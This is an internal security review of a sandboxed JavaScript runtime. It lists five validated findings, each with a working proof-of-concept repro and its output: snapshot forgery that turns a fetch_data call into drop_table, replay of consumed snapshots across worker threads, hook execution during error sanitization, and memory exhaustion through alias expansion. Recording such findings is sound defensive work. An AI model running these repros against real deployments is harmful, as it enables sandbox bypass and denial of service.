# Security Issues 5

This file records validated findings from the fifth threat-model review on
2026-04-12.

Review method:

- Selected 12 primary trust-boundary files from the repository threat model.
- Ran one `gpt-5.4` `xhigh` hunter per target file.
- Collapsed duplicates and rejected documented non-goals or contract-exception
  cases.
- Ran separate skeptical verifier agents for surviving issues where useful.
- Reproduced the surviving issues locally with focused read-only repros before
  recording them here.

## Reviewed Targets

- [`native-loader.js`](native-loader.js)
- [`install.js`](install.js)
- [`lib/structured.js`](lib/structured.js)
- [`lib/policy.js`](lib/policy.js)
- [`lib/progress.js`](lib/progress.js)
- [`lib/runtime.js`](lib/runtime.js)
- [`crates/jslite-node/src/lib.rs`](crates/jslite-node/src/lib.rs)
- [`crates/jslite-sidecar/src/lib.rs`](crates/jslite-sidecar/src/lib.rs)
- [`crates/jslite-bridge/src/operations.rs`](crates/jslite-bridge/src/operations.rs)
- [`crates/jslite/src/runtime/validation/snapshot.rs`](crates/jslite/src/runtime/validation/snapshot.rs)
- [`crates/jslite/src/runtime/conversions/boundary.rs`](crates/jslite/src/runtime/conversions/boundary.rs)
- [`crates/jslite/src/runtime/builtins/primitives.rs`](crates/jslite/src/runtime/builtins/primitives.rs)

## High: host-error sanitization executes attacker-controlled `error.code` hooks

**Affected files**

- [`lib/structured.js`](lib/structured.js)
- [`lib/runtime.js`](lib/runtime.js)
- [`lib/progress.js`](lib/progress.js)

**Impact**

`encodeResumePayloadError()` reads `error.code` as an own data property, but
then passes it straight into `JSON.stringify(...)` as `code: code ?? null`.
That lets attacker-controlled `toJSON` hooks or nested serialization hooks run
during supposed fail-closed host-error sanitization.

This violates the documented host-error boundary guarantee that proxy traps,
coercion hooks, and similar host-side code should not run during sanitization.
It is reachable through both public host-error paths:

- capability failures during `Jslite.run()`
- explicit `Progress.resumeError(...)`

**Validation notes**

- Independent verifier confirmed the issue against the current checkout.
- Local repro confirmed both behaviors:
  - the host-side `toJSON` hook runs
  - the hook controls the guest-visible `error.code`

**Short repro**

```js
const { Jslite } = require('./index.js');

(async () => {
  const events = [];
  const result = await new Jslite(`
    let outcome = 'missing';
    try {
      fetch_data();
    } catch (error) {
      outcome = [error.code, error.message];
    }
    outcome;
  `).run({
    capabilities: {
      fetch_data() {
        const error = new Error('boom');
        error.code = {
          toJSON() {
            events.push('toJSON');
            return 'E_PWN';
          },
        };
        throw error;
      },
    },
  });

  console.log({ result, events });
})();
```

Current result on this checkout:

```txt
{ result: [ 'E_PWN', 'boom' ], events: [ 'toJSON' ] }
```

## High: same-process `Progress` single-use enforcement fails across `worker_threads`

**Affected files**

- [`lib/progress.js`](lib/progress.js)
- [`lib/policy.js`](lib/policy.js)
- [`docs/HOST_API.md`](docs/HOST_API.md)

**Impact**

The Node wrapper stores consumed snapshot burns in the module-local
`USED_PROGRESS_SNAPSHOTS` set and cached restore policy in the module-local
`KNOWN_PROGRESS_POLICIES` map. A `worker_threads` isolate gets fresh module
state even though it shares the same Node process.

That means a dump consumed in one worker can still be loaded in another worker
with explicit `capabilities`, `limits`, and `snapshotKey`. In that second
worker, `Progress.load(...)` exposes authoritative `progress.capability` and
`progress.args`, and `resume()` succeeds again.

This contradicts the current host API contract, which says already-consumed
same-process dumps are rejected before exposing metadata and stay burned for
the lifetime of the current process.

**Validation notes**

- Independent verifier confirmed the issue against the current checkout.
- Local repro confirmed both properties:
  - main thread and worker shared the same PID
  - the worker reloaded and resumed an already-consumed dump successfully

**Short repro**

```js
const { Worker } = require('node:worker_threads');
const { Jslite, Progress } = require('./index.js');

const snapshotKey = Buffer.from('worker-thread-replay-key');
const dumped = new Jslite('const v = fetch_data(4); v * 2;').start({
  snapshotKey,
  capabilities: { fetch_data() {} },
  limits: {},
}).dump();

const first = Progress.load(dumped, {
  snapshotKey,
  capabilities: { fetch_data(value) { return value; } },
  limits: {},
});
console.log(first.resume(4)); // 8

const worker = new Worker(`
  const { parentPort, workerData } = require('node:worker_threads');
  const { Progress } = require(workerData.indexPath);
  const snapshotKey = Buffer.from(workerData.snapshotKeyBase64, 'base64');
  const progress = Progress.load({
    snapshot: Buffer.from(workerData.snapshotBase64, 'base64'),
    token: workerData.token,
  }, {
    snapshotKey,
    capabilities: { fetch_data(value) { return value; } },
    limits: {},
  });
  parentPort.postMessage({
    pid: process.pid,
    capability: progress.capability,
    args: progress.args,
    result: progress.resume(4),
  });
`, {
  eval: true,
  workerData: {
    indexPath: require.resolve('./index.js'),
    snapshotBase64: dumped.snapshot.toString('base64'),
    token: dumped.token,
    snapshotKeyBase64: snapshotKey.toString('base64'),
  },
});

worker.once('message', (message) => console.log(message));
```

Current result on this checkout:

```txt
8
{ pid: <same main pid>, capability: 'fetch_data', args: [ 4 ], result: 8 }
```

## Critical: sidecar `resume` accepts forged snapshots without authenticating them

**Affected files**

- [`crates/jslite-sidecar/src/lib.rs`](crates/jslite-sidecar/src/lib.rs)
- [`crates/jslite-bridge/src/dto.rs`](crates/jslite-bridge/src/dto.rs)
- [`crates/jslite-bridge/src/operations.rs`](crates/jslite-bridge/src/operations.rs)

**Impact**

The sidecar resume path accepts `SnapshotPolicyDto`, including
`snapshot_key_base64` and `snapshot_token`, but never authenticates the raw
snapshot bytes before resuming them. `SnapshotPolicyDto::into_snapshot_policy()`
drops both auth fields and forwards only `capabilities` and `limits`.

As a result, a hostile sidecar client or tamperer of persisted snapshot bytes
can rewrite a valid snapshot and resume it successfully as long as the forged
capability name is still present in the supplied allowlist.

This re-opens the same forged-snapshot steering class that the raw Node addon
now blocks with HMAC authentication.

**Validation notes**

- Independent verifier confirmed the issue against the current checkout.
- Local repro confirmed that obviously bogus `snapshot_key_base64` and
  `snapshot_token` were ignored and a forged `drop_table("wipe")` suspension
  was accepted.

**Short repro**

```js
const { spawn } = require('node:child_process');

function request(proc, obj) {
  return new Promise((resolve, reject) => {
    const onData = (chunk) => {
      cleanup();
      resolve(JSON.parse(chunk.toString('utf8').trim()));
    };
    const onExit = (code) => {
      cleanup();
      reject(new Error(`sidecar exited ${code}`));
    };
    const cleanup = () => {
      proc.stdout.off('data', onData);
      proc.off('exit', onExit);
    };
    proc.stdout.once('data', onData);
    proc.once('exit', onExit);
    proc.stdin.write(JSON.stringify(obj) + '\\n');
  });
}

(async () => {
  const proc = spawn('cargo', ['run', '-q', '-p', 'jslite-sidecar'], {
    cwd: process.cwd(),
    stdio: ['pipe', 'pipe', 'inherit'],
  });

  const source =
    'const first = fetch_data(\"seed\"); const second = fetch_data(\"safe\"); second;';
  const compiled = await request(proc, { method: 'compile', id: 1, source });
  const started = await request(proc, {
    method: 'start',
    id: 2,
    program_base64: compiled.result.program_base64,
    options: { inputs: {}, capabilities: ['fetch_data', 'drop_table'], limits: {} },
  });

  const mutated = Buffer.from(started.result.step.snapshot_base64, 'base64');
  for (const [from, to] of [['fetch_data', 'drop_table'], ['safe', 'wipe']]) {
    const a = Buffer.from(from);
    const b = Buffer.from(to);
    for (let i = 0; i <= mutated.length - a.length; i += 1) {
      if (mutated.subarray(i, i + a.length).equals(a)) {
        b.copy(mutated, i);
        i += a.length - 1;
      }
    }
  }

  const resumed = await request(proc, {
    method: 'resume',
    id: 3,
    snapshot_base64: mutated.toString('base64'),
    policy: {
      capabilities: ['fetch_data', 'drop_table'],
      limits: {},
      snapshot_key_base64: 'bogus',
      snapshot_token: 'bogus',
    },
    payload: { type: 'value', value: { String: 'ok' } },
  });

  console.log(resumed);
  proc.kill();
})();
```

Current result on this checkout:

```txt
{ ok: true, result: { kind: 'step', step: { capability: 'drop_table', args: [Array] } } }
```

## Critical: structured-boundary alias expansion bypasses `heapLimitBytes`

**Affected files**

- [`crates/jslite/src/runtime/conversions/boundary.rs`](crates/jslite/src/runtime/conversions/boundary.rs)

**Impact**

`value_to_structured_inner()` tracks only the current recursion stack to detect
cycles, then removes arrays and objects from the traversal state on unwind.
That prevents cycles, but it does not preserve alias identity or account for
shared subgraphs.

A guest can keep a small DAG-shaped value under the runtime heap limit and then
force exponential tree expansion when the runtime converts that value to a
structured host result or capability argument. That expanded `StructuredValue`
allocation happens outside guest heap accounting.

In addon mode this is same-process CPU and memory exhaustion. In sidecar mode
it is an easy request-amplification and worker-kill primitive.

**Validation notes**

- Local repro confirmed a runtime configured with `heapLimitBytes: 50_000`
  still materialized a `5_505_006` byte capability argument at the structured
  boundary.
- The code path is direct in the current checkout and the behavior violates the
  documented limit model.

**Short repro**

```js
const { Jslite } = require('./index.js');

const depth = 18;
const source = `
  const leaf = [0];
  let value = leaf;
  for (let i = 0; i < ${depth}; i = i + 1) {
    value = { left: value, right: value };
  }
  send(value);
`;

const progress = new Jslite(source).start({
  capabilities: { send() {} },
  limits: { heapLimitBytes: 50_000 },
});

console.log(JSON.stringify(progress.args[0]).length);
```

Current result on this checkout:

```txt
5505006
```

## High: public `ExecutionSnapshot` deserialization bypasses snapshot validation and policy rebinding

**Affected files**

- [`crates/jslite/src/runtime/api.rs`](crates/jslite/src/runtime/api.rs)
- [`crates/jslite/src/runtime/serialization.rs`](crates/jslite/src/runtime/serialization.rs)
- [`crates/jslite/src/runtime/validation/snapshot.rs`](crates/jslite/src/runtime/validation/snapshot.rs)
- [`crates/jslite/src/runtime/mod.rs`](crates/jslite/src/runtime/mod.rs)

**Impact**

`ExecutionSnapshot` is a public type that derives `Serialize` and `Deserialize`,
and `resume()` accepts it directly. That lets a Rust embedder deserialize
attacker-controlled bytes straight into `ExecutionSnapshot` and skip
`load_snapshot()` entirely.

Skipping `load_snapshot()` bypasses:

- structural snapshot validation
- serialization version checks
- accounting recomputation after load
- the `snapshot_policy_required = true` fail-closed bit

That defeats the documented contract that loaded snapshots are inert until the
host rebinds explicit policy.

**Validation notes**

- Local repro confirmed that directly deserializing a forged snapshot with
  `bincode::deserialize::<ExecutionSnapshot>(...)` and then calling `resume(...)`
  produced a forged `drop_table` suspension instead of any validation or policy
  error.
- This repro used only the public crate API and read-only compilation from
  stdin with `rustc`.

**Short repro**

```rust
use jslite::{
    compile, resume, start, ExecutionOptions, ExecutionSnapshot, ExecutionStep,
    ResumePayload, StructuredValue,
};

fn replace_all_ascii(buffer: &mut [u8], from: &str, to: &str) {
    let from = from.as_bytes();
    let to = to.as_bytes();
    let mut i = 0usize;
    while i + from.len() <= buffer.len() {
        if &buffer[i..i + from.len()] == from {
            buffer[i..i + to.len()].copy_from_slice(to);
            i += from.len();
        } else {
            i += 1;
        }
    }
}

fn main() {
    let program =
        compile("const first = fetch_data(1); const second = fetch_data(2); [first, second];")
            .unwrap();
    let step = start(
        &program,
        ExecutionOptions {
            capabilities: vec!["fetch_data".to_string()],
            ..ExecutionOptions::default()
        },
    )
    .unwrap();
    let suspension = match step {
        ExecutionStep::Suspended(s) => s,
        ExecutionStep::Completed(_) => unreachable!(),
    };

    let mut bytes = bincode::serialize(&suspension.snapshot).unwrap();
    replace_all_ascii(&mut bytes, "fetch_data", "drop_table");
    let forged: ExecutionSnapshot = bincode::deserialize(&bytes).unwrap();

    let resumed =
        resume(forged, ResumePayload::Value(StructuredValue::from(1.0))).unwrap();
    println!("{resumed:?}");
}
```

Current result on this checkout:

```txt
Suspended(Suspension { capability: "drop_table", args: [Number(Finite(2.0))], ... })
```
